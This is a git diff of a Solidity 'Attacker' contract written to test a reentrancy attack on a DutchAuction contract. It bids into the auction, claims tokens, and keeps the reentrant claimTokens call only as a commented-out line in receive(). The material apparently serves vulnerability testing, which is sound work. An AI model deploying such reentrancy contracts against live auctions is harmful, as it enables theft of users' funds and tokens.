@@ -5,23 +5,29 @@ import "./DutchAuction.sol"; // Import the DutchAuction contract to attack.
 
 contract Attacker {
     DutchAuction public auctionContract;
-
+    event Received(address, uint);
+    
+    uint public total;
     constructor(address payable _auctionContract) {
         auctionContract = DutchAuction(_auctionContract);
     }
 
     // Function to perform the reentrancy attack
-    function attack() public {
+    function attack() payable public {
         // Call the bid function on the DutchAuction contract to participate in the auction.
-        auctionContract.bid{value: 1 ether}(address(0));
+        auctionContract.bid{ value: msg.value }(address(this));
+    }
+
+    function claimTokens() public{
         auctionContract.claimTokens(address(this));
     }
 
     fallback() external payable {
-        auctionContract.claimTokens(address(this));
     }
     
     receive() external payable {
-    // Handle incoming Ether here or leave it empty if no action is needed.
+        // Perform reentrancy attack again by calling claimTokens again
+        // auctionContract.claimTokens(address(this));
+        emit Received(msg.sender, msg.value);
     }
 }
